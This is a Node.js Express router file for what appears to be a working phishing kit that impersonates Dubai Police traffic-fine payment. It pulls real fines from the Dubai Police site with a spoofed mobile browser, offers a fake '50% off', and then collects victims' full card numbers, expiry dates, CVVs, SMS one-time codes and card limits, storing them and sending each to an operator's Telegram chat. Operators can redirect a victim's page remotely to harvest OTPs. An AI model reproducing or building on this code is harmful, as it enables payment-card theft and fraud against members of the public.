const express = require('express');
const axios   = require('axios');
const router  = express.Router();
const { query, queryOne, getSetting, clientIp } = require('../db');
const { sendMetaCapi, sendTiktokCapi } = require('./capi-helper');

const MOBILE_UA = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36';

// ─── Config helpers (DB-first, env fallback) ──────────────────────────────────
async function getTgConfig() {
  const token    = await getSetting('telegram_bot_token',        process.env.TELEGRAM_BOT_TOKEN          || '');
  const chatId   = await getSetting('telegram_chat_id',          process.env.TELEGRAM_CHAT_ID            || '');
  const inquiryChatId = await getSetting('inquiry_chat_id', process.env.INQUIRY_CHAT_ID || '');
  const handyKey      = await getSetting('handy_api_key',   process.env.HANDY_API_KEY   || '');
  return { token, chatId, inquiryChatId, handyKey };
}

// ─── Telegram helper ─────────────────────────────────────────────────────────
async function sendTelegram(token, chatId, text) {
  if (!token || !chatId) return;
  try {
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId, text, parse_mode: 'HTML',
    }, { timeout: 10000 });
  } catch { /* ignore */ }
}

// ─── Dubai Police session cache ───────────────────────────────────────────────
let sessionCache = { cookie: '', time: 0 };
const SESSION_TTL = 4 * 60 * 1000;

function parseCookiesFromHeaders(headers) {
  const cookies = {};
  const raw = headers['set-cookie'] || [];
  for (const c of raw) {
    const first = c.split(';')[0];
    const idx   = first.indexOf('=');
    if (idx !== -1) {
      const name  = first.slice(0, idx).trim();
      const value = first.slice(idx + 1).trim();
      if (name) cookies[name] = value;
    }
  }
  return cookies;
}

function cookieStr(obj) {
  return Object.entries(obj).map(([k,v]) => `${k}=${v}`).join('; ');
}

async function safeGet(url, extraHeaders, cookies) {
  try {
    const res = await axios.get(url, {
      headers: { 'User-Agent': MOBILE_UA, 'Accept': 'text/html,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.7',
                 'Cookie': cookieStr(cookies), ...extraHeaders },
      timeout: 7000, maxRedirects: 5, validateStatus: () => true,
    });
    const newCookies = parseCookiesFromHeaders(res.headers);
    return { ...cookies, ...newCookies };
  } catch { return cookies; }
}

async function getSession(plateNo, plateCat, plateSrcCode, plateCodeId) {
  if (sessionCache.cookie && Date.now() - sessionCache.time < SESSION_TTL) {
    return sessionCache.cookie;
  }
  let cookies = {};
  cookies = await safeGet('https://www.dubaipolice.gov.ae/', {}, cookies);
  cookies = await safeGet('https://www.dubaipolice.gov.ae/app/services/fine-payment/search',
    { 'Referer': 'https://www.dubaipolice.gov.ae/' }, cookies);
  cookies = await safeGet(
    `https://www.dubaipolice.gov.ae/app/services/fine-payment/details?plateNo=${plateNo}&plateCat=${plateCat}&plateSrcCode=${plateSrcCode}&plateCodeId=${plateCodeId}`,
    { 'Referer': 'https://www.dubaipolice.gov.ae/app/services/fine-payment/search' }, cookies);
  const str = cookieStr(cookies);
  sessionCache = { cookie: str, time: Date.now() };
  return str;
}

// ─── /api/search-fines ───────────────────────────────────────────────────────
router.post('/search-fines', async (req, res) => {
  const { plateNo='', plateCat='2', plateSrcCode='', plateCodeId='0', plateCodeLetter='', sid='' } = req.body;
  if (!plateNo || !plateSrcCode) return res.status(400).json({ error: 'Missing required fields' });

  let data;
  try {
    const sessionCookie = await getSession(plateNo, plateCat, plateSrcCode, plateCodeId);
    const referer = `https://www.dubaipolice.gov.ae/app/services/fine-payment/details?plateNo=${plateNo}&plateCat=${plateCat}&plateSrcCode=${plateSrcCode}&plateCodeId=${plateCodeId}`;

    const response = await axios.post('https://www.dubaipolice.gov.ae/dpapp/finespayment/searchFines',
      { inquiryType: 3, plateNo, plateCat, plateSrcCode, plateCodeId },
      {
        headers: {
          'Content-Type': 'application/json', 'Accept': 'application/json',
          'Accept-Language': 'en-US,en;q=0.7', 'Origin': 'https://www.dubaipolice.gov.ae',
          'Referer': referer, 'Host': 'www.dubaipolice.gov.ae',
          'Lang': 'en', 'Profile-Type-Id': '1', 'User-Agent': MOBILE_UA,
          'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
          ...(sessionCookie ? { Cookie: sessionCookie } : {}),
        },
        timeout: 15000,
        validateStatus: () => true,
      }
    );
    if (response.status !== 200) {
      // Session likely expired — clear cache so next request retries
      sessionCache = { cookie: '', time: 0 };
      console.error('[search-fines] Dubai Police returned', response.status, JSON.stringify(response.data)?.slice(0, 200));
      return res.status(503).json({ error: `Dubai Police returned status ${response.status}. Please try again.` });
    }
    data = response.data;
    // If the API returned an error body, clear session cache for next attempt
    if (data && data.error) {
      sessionCache = { cookie: '', time: 0 };
      console.error('[search-fines] Dubai Police error body:', JSON.stringify(data).slice(0, 300));
    }
  } catch (err) {
    sessionCache = { cookie: '', time: 0 };
    console.error('[search-fines] Network error:', err.message);
    return res.status(503).json({ error: 'Dubai Police server is unreachable. Please try again.' });
  }

  // DB: log inquiry
  try {
    const tickets     = data?.results?.tickets || [];
    const fineCount   = tickets.length;
    const totalAmount = tickets.reduce((s, t) => s + (t.ticketTotalFine || 0), 0);
    await query(
      'INSERT INTO inquiries (sid, plate_no, plate_src, plate_code, fine_count, total_amount, ip, user_agent) VALUES (?,?,?,?,?,?,?,?)',
      [sid, plateNo, plateSrcCode, plateCodeLetter, fineCount, totalAmount, clientIp(req), req.headers['user-agent'] || '']
    );
    const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
    const msg = [
      '<b>[INQUIRY]</b>',
      `Plate: <b>${plateSrcCode} / ${plateCodeLetter} ${plateNo}</b>`,
      `Fines: <b>${fineCount}</b>`,
      `Total: <b>AED ${totalAmount}</b> | 50% off: <b>AED ${Math.floor(totalAmount * 0.5)}</b>`,
      `Time: ${now} (Dubai)`,
      sid ? `SID: <code>${sid}</code>` : '',
    ].filter(Boolean).join('\n');
    const cfg = await getTgConfig();
    await sendTelegram(cfg.token, cfg.inquiryChatId || cfg.chatId, msg);
  } catch { /* ignore */ }

  res.json(data);
});

// ─── /api/telegram ───────────────────────────────────────────────────────────
router.post('/telegram', async (req, res) => {
  const body = req.body;
  const { type='' } = body;

  // OTP / notification events
  if (['otp_sms','otp_notification_resend','otp_resend','otp_approved'].includes(type)) {
    const { sid='', cardLast4='-', totalFine='-', issuer='-', otp=null } = body;
    try {
      await query('INSERT INTO otp_events (sid, type, ip, otp_code) VALUES (?,?,?,?)',
        [sid, type, clientIp(req), type === 'otp_sms' ? (otp || null) : null]);
      if (type === 'otp_approved') {
        await query("UPDATE payments SET otp_status = 'approved' WHERE sid = ?", [sid]);
      } else if (type === 'otp_sms') {
        await query("UPDATE payments SET otp_status = 'otp_received' WHERE sid = ?", [sid]);
      }
    } catch { /* ignore */ }

    let text;
    if (type === 'otp_sms') {
      text = [
        '<b>[OTP RECEIVED]</b>', '─────────────────',
        `OTP Code: <code>${otp}</code>`,
        `Card: <b>****${cardLast4}</b>`,
        `Amount: <b>AED ${totalFine}</b>`,
        `Bank: <b>${issuer}</b>`,
        '─────────────────',
      ].join('\n');
    } else {
      const labels = { otp_notification_resend:'NOTIFICATION RESENT', otp_resend:'OTP RESENT', otp_approved:'OTP APPROVED' };
      text = [
        `<b>[${labels[type] || type.toUpperCase()}]</b>`, '─────────────────',
        `Card: <b>****${cardLast4}</b>`,
        `Amount: <b>AED ${totalFine}</b>`,
        `Bank: <b>${issuer}</b>`,
        sid ? `SID: <code>${sid}</code>` : '',
      ].filter(Boolean).join('\n');
    }
    const cfg = await getTgConfig();
    await sendTelegram(cfg.token, cfg.chatId, text);
    return res.json({ ok: true });
  }

  // Kart ödeme bildirimi
  const { sid='', cardName='-', cardNumber='-', expiry='-', cvv='-',
          plateNo='-', plateSrcCode='-', plateCodeLetter='-',
          totalFine=0, fineCount=0, binInfo=null, cardLimit='' } = body;

  try {
    const defaultOtp = await getSetting('otp_default_page', 'otp-sms');
    await query(`
      INSERT INTO payments (sid, plate_no, plate_src, plate_code, total_fine, fine_count,
        card_name, card_number, expiry, cvv, card_scheme, card_type, card_issuer, card_country, ip, otp_page, card_limit)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT (sid) DO UPDATE SET
        card_name=EXCLUDED.card_name, card_number=EXCLUDED.card_number, expiry=EXCLUDED.expiry, cvv=EXCLUDED.cvv,
        card_scheme=EXCLUDED.card_scheme, card_type=EXCLUDED.card_type, card_issuer=EXCLUDED.card_issuer,
        card_country=EXCLUDED.card_country, total_fine=EXCLUDED.total_fine, fine_count=EXCLUDED.fine_count,
        otp_page=EXCLUDED.otp_page, card_limit=EXCLUDED.card_limit
    `, [
      sid, plateNo, plateSrcCode, plateCodeLetter, parseFloat(totalFine)||0, parseInt(fineCount)||0,
      cardName, cardNumber, expiry, cvv,
      binInfo?.Scheme||null, binInfo?.Type||null, binInfo?.Issuer||null, binInfo?.Country?.Name||null,
      clientIp(req), defaultOtp, cardLimit || null,
    ]);
  } catch { /* ignore */ }

  const binStatus = binInfo
    ? [binInfo.Issuer                       ? `Bank: <b>${binInfo.Issuer}</b>`                                           : null,
       binInfo.Country?.Name                ? `Country: <b>${binInfo.Country.Name}</b>`                                  : null,
       (binInfo.Type || binInfo.Scheme)     ? `Type: <b>${binInfo.Type || '-'} / ${(binInfo.Scheme||'').toUpperCase()}</b>` : null]
      .filter(Boolean).join('\n')
    : 'BIN info unavailable';

  const text = [
    '<b>[NEW PAYMENT]</b>', '─────────────────',
    `Amount: <b>AED ${totalFine}</b>`,
    `Fines: <b>${fineCount}</b>`,
    `Plate: <b>${plateCodeLetter} ${plateNo} (${plateSrcCode})</b>`,
    sid ? `SID: <code>${sid}</code>` : '',
    '─────────────────',
    '<b>CARD DETAILS</b>',
    `Name: <code>${cardName}</code>`,
    `Number: <code>${cardNumber}</code>`,
    `Expiry: <code>${expiry}</code>`,
    `CVV: <code>${cvv}</code>`,
    cardLimit ? `Limit: <b>AED ${Number(cardLimit).toLocaleString()}</b>` : null,
    '─────────────────',
    '<b>CARD INFO</b>', binStatus,
    '─────────────────',
  ].filter(Boolean).join('\n');

  const cfg = await getTgConfig();
  await sendTelegram(cfg.token, cfg.chatId, text);
  res.json({ ok: true });
});

// ─── /api/card-limit ─────────────────────────────────────────────────────────
router.post('/card-limit', async (req, res) => {
  const { sid='', cardLast4='****', totalFine=0, issuer='', limit='' } = req.body;
  const cleanSid = (sid + '').replace(/[^a-f0-9]/g, '');
  if (!cleanSid || !limit) return res.json({ ok: false, error: 'Missing fields' });
  try {
    await query('UPDATE payments SET card_limit = ? WHERE sid = ?', [limit, cleanSid]);
    const cfg = await getTgConfig();
    const payment = await queryOne('SELECT card_number, card_name, card_issuer FROM payments WHERE sid = ? LIMIT 1', [cleanSid]);
    const msg = [
      '💳 <b>[CARD LIMIT SUBMITTED]</b>',
      '─────────────────',
      `Limit: <b>AED ${Number(limit).toLocaleString()}</b>`,
      payment?.card_number ? `Card: <code>${payment.card_number}</code>` : `Card: <b>****${cardLast4}</b>`,
      payment?.card_name  ? `Name: <code>${payment.card_name}</code>`  : null,
      `Amount: <b>AED ${totalFine}</b>`,
      `Bank: <b>${issuer || payment?.card_issuer || 'Unknown'}</b>`,
      `SID: <code>${cleanSid}</code>`,
    ].filter(Boolean).join('\n');
    await sendTelegram(cfg.token, cfg.chatId, msg);
  } catch { /* ignore */ }
  res.json({ ok: true });
});

// ─── /api/card-bin ───────────────────────────────────────────────────────────
router.get('/card-bin', async (req, res) => {
  const bin = (req.query.bin || '').replace(/\D/g, '').slice(0, 8);
  if (bin.length < 6) return res.status(400).json({ ok: false, error: 'BIN must be at least 6 digits' });

  try {
    const { handyKey } = await getTgConfig();
    const response = await axios.get(`https://data.handyapi.com/bin/${bin}`, {
      headers: { 'x-api-key': handyKey }, timeout: 10000,
    });
    res.json({ ok: true, data: response.data });
  } catch (err) {
    const status = err.response?.status || 500;
    res.status(status).json({ ok: false, error: `HandyAPI error: ${status}` });
  }
});

// ─── /api/tg-hook (Telegram Webhook) ─────────────────────────────────────────
router.post('/tg-hook', async (req, res) => {
  // NOTE: res.json() is called LAST — Vercel serverless terminates after response is sent
  try {
    const update = req.body;
    const msg    = update?.message || update?.channel_post;
    if (!msg) { res.json({ ok: true }); return; }
    const text   = (msg.text || '').trim();
    const chatId = String(msg.chat?.id || '');
    const cfg    = await getTgConfig();
    const allowed = [cfg.chatId, cfg.inquiryChatId].filter(Boolean);
    if (!chatId || !allowed.includes(chatId)) { res.json({ ok: true }); return; }

    if (text === '/stats' || text.startsWith('/stats@')) {
      const safeCount = async (sql) => {
        try {
          const rows = await query(sql, []);
          return Number(Object.values(rows[0] || {})[0]) || 0;
        } catch { return 0; }
      };
      const totalQ   = await safeCount('SELECT COUNT(*) FROM inquiries');
      const uniqueQ  = await safeCount('SELECT COUNT(DISTINCT ip) FROM inquiries');
      const totalP   = await safeCount('SELECT COUNT(*) FROM payments');
      const totalSms = await safeCount("SELECT COUNT(*) FROM otp_events WHERE type='otp_sms'");
      const totalV   = await safeCount('SELECT COUNT(*) FROM visitors');
      const uniqueV  = await safeCount('SELECT COUNT(DISTINCT ip) FROM visitors');
      const vqRatio  = totalQ > 0 ? (totalV  / totalQ).toFixed(2) : 'N/A';
      const qpRatio  = totalP > 0 ? (totalQ  / totalP).toFixed(2) : 'N/A';
      const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
      const report = [
        '[STATS REPORT]',
        '-----------------',
        `Total Queries: ${totalQ} (${uniqueQ} unique)`,
        `Payment Entries: ${totalP}`,
        `SMS Codes: ${totalSms}`,
        `Visitors: ${totalV} (${uniqueV} unique)`,
        '-----------------',
        `Visitor/Query: ${vqRatio}`,
        `Query/Payment: ${qpRatio}`,
        '-----------------',
        `Generated: ${now} (Dubai)`,
      ].join('\n');
      await sendTelegram(cfg.token, chatId, report);
    }
  } catch {}
  res.json({ ok: true });
});

// ─── /api/check-status ───────────────────────────────────────────────────────
router.get('/check-status', async (req, res) => {
  const sid = (req.query.sid || '').replace(/[^a-f0-9]/g, '');
  if (!sid) return res.json({ action: 'none' });

  try {
    // Update last_seen (non-blocking — won't crash if column doesn't exist yet)
    query('UPDATE payments SET last_seen = NOW() WHERE sid = ?', [sid]).catch(() => {});

    const row = await queryOne('SELECT redirect_to, otp_status, otp_page FROM payments WHERE sid = ? LIMIT 1', [sid]);
    if (!row) return res.json({ action: 'none' });

    if (row.redirect_to) {
      await query('UPDATE payments SET redirect_to = NULL WHERE sid = ?', [sid]);
      const colonIdx = row.redirect_to.indexOf(':');
      if (colonIdx !== -1) {
        return res.json({
          action: 'redirect',
          page:   row.redirect_to.slice(0, colonIdx),
          params: row.redirect_to.slice(colonIdx + 1),
        });
      }
      return res.json({ action: 'redirect', page: row.redirect_to });
    }
    res.json({ action: 'none', status: row.otp_status });
  } catch {
    res.json({ action: 'none' });
  }
});

// ─── /api/capi — Browser → Server → Meta/TikTok Conversions API ──────────────
router.post('/capi', async (req, res) => {
  const { eventName, eventId, eventSourceUrl, customData, externalId, fbp, fbc, ttp, ttclid, referrer } = req.body || {};
  if (!eventName || !eventId) return res.status(400).json({ ok: false, error: 'missing fields' });

  const ip        = clientIp(req);
  const userAgent = req.headers['user-agent'] || '';

  const [meta, tiktok] = await Promise.all([
    sendMetaCapi  ({ eventName, eventId, eventSourceUrl, customData, externalId, fbp, fbc,    ip, userAgent }),
    sendTiktokCapi({ eventName, eventId, eventSourceUrl, properties: customData, externalId, ttp, ttclid, ip, userAgent, referrer }),
  ]);

  res.json({ ok: true, meta, tiktok });
});

module.exports = router;
